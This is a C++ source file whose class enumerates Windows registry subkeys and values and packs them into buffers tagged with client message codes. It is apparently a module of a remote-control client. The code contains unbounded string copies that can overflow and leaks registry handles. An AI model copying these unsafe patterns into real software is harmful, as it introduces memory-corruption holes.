#include "stdafx.h"
#include "Common.h"

#include "RegistryInterface.h"




CRegistryInterface::CRegistryInterface(BYTE IsToken)
{
	switch (IsToken)
	{
	case MHKEY_CLASSES_ROOT:
		_M_hKey = HKEY_CLASSES_ROOT;
		break;
	case MHKEY_CURRENT_USER:
		_M_hKey = HKEY_CURRENT_USER;
		break;
	case MHKEY_LOCAL_MACHINE:
		_M_hKey = HKEY_LOCAL_MACHINE;
		break;
	case MHKEY_USERS:
		_M_hKey = HKEY_USERS;
		break;
	case MHKEY_CURRENT_CONFIG:
		_M_hKey = HKEY_CURRENT_CONFIG;
		break;
	default:
		_M_hKey = HKEY_LOCAL_MACHINE;
		break;
	}

	ZeroMemory(_M_KeyPath, MAX_PATH);


	return;
}

CRegistryInterface::~CRegistryInterface()
{
}


VOID   CRegistryInterface::SetPath(TCHAR* FileFullPath)
{
	ZeroMemory(_M_KeyPath, MAX_PATH);
	_tcscpy(_M_KeyPath, FileFullPath);

	return;
}

TCHAR* CRegistryInterface::FindPath()
{
	TCHAR* BufferData = NULL;
	HKEY   hKey;

	if (RegOpenKeyEx(_M_hKey, _M_KeyPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
	{
		DWORD Index = 0, NameCount;
		ULONG NameMaxLen;
		DWORD KeyCount;
		ULONG KeySize,  KeyMaxLen;
		ULONG MaxDataLen;

		if (ERROR_SUCCESS != RegQueryInfoKey(
									hKey,
									NULL, NULL, NULL,
									&KeyCount,
									&KeyMaxLen,
									NULL,
									&NameCount,
									&NameMaxLen,
									&MaxDataLen,
									NULL, NULL
								))
		{
			return NULL;
		}

		KeySize = KeyMaxLen + 1;

		if (KeyCount > 0 && KeySize > 1)
		{

			int Size = sizeof(REGMSG) + 1;

			DWORD DataSize = KeyCount * KeySize + Size + 1;
			BufferData = (TCHAR*)LocalAlloc(LPTR, DataSize);
			
			ZeroMemory(BufferData, DataSize);

			BufferData[0] = CLIENT_REGISTRY_REG_PATH;

			REGMSG msg;

			msg.size  = KeySize;
			msg.count = KeyCount;
			

			memcpy(BufferData + 1, (void*)&msg, Size);

			TCHAR* StrTemp = new TCHAR[KeySize];
			for (Index = 0; Index < KeyCount; Index++)
			{
				ZeroMemory(StrTemp, KeySize);
				DWORD i = KeySize;
				RegEnumKeyEx(
						hKey, Index,
						StrTemp, &i,
						NULL, NULL,
						NULL, NULL
					);

				_tcscpy(BufferData + Index*KeySize + Size, StrTemp);
			}
			delete[] StrTemp;
			RegCloseKey(hKey);
		}

	}

	return BufferData;
}

TCHAR* CRegistryInterface::FindKey()
{
	TCHAR* ValueName;
	BYTE * Value;

	TCHAR* BufferData = NULL;
	HKEY  hKey;

	if (RegOpenKeyEx(_M_hKey, _M_KeyPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
	{
		DWORD Index = 0, NameCount, Type;
		ULONG NameSize, NameMaxLen;
		DWORD KeyCount;
		ULONG KeyMaxLen;
		ULONG DataSize, MaxDataLen;
		if (ERROR_SUCCESS != RegQueryInfoKey(
									hKey,
									NULL,NULL,NULL,
									&KeyCount,
									&KeyMaxLen,
									NULL,
									&NameCount,
									&NameMaxLen,
									&MaxDataLen,
									NULL,NULL
								))
		{
			return NULL;
		}

		if (NameCount > 0 && MaxDataLen > 0 && NameMaxLen > 0)
		{
			DataSize = MaxDataLen + 1;
			NameSize = NameMaxLen + 100;
			REGMSG msg;

			msg.count = NameCount;
			msg.size  = NameSize;
			msg.valsize = DataSize;
			int msgsize = sizeof(REGMSG);

			ULONG BufferLength =
					sizeof(REGMSG) + sizeof(BYTE) + NameSize*NameCount
					+ DataSize*NameCount + 10;
			BufferData = (TCHAR*)LocalAlloc(LPTR, BufferLength);
			ZeroMemory(BufferData, BufferLength);

			BufferData[0] = CLIENT_REGISTRY_REG_KEY;

			memcpy(BufferData + 1, (void*)&msg, msgsize);

			Value     = (BYTE*)malloc(DataSize);
			ValueName = (char*)malloc(NameSize);
			
			TCHAR* StrTemp = BufferData + msgsize + 1;
			for (Index = 0; Index < NameCount; Index++) {
				ZeroMemory(Value,     DataSize);
				ZeroMemory(ValueName, NameSize);

				DataSize = MaxDataLen + 1;
				NameSize = NameMaxLen + 100;

				RegEnumValue(
						hKey, Index,
						ValueName, &NameSize,
						NULL, &Type,
						Value, &DataSize);

				if (Type == REG_SZ)
				{
					StrTemp[0] = MREG_SZ;
				}
				if (Type == REG_DWORD)
				{
					StrTemp[0] = MREG_DWORD;
				}
				if (Type == REG_BINARY)
				{
					StrTemp[0] = MREG_BINARY;
				}
				if (Type == REG_EXPAND_SZ)
				{
					StrTemp[0] = MREG_EXPAND_SZ;
				}
				
				StrTemp += sizeof(BYTE);
				_tcscpy(StrTemp, ValueName);
				StrTemp += msg.size;
				memcpy(StrTemp, Value, msg.valsize);
				StrTemp += msg.valsize;
			}
			free(ValueName);
			free(Value);
		}
	}

	return BufferData;
}
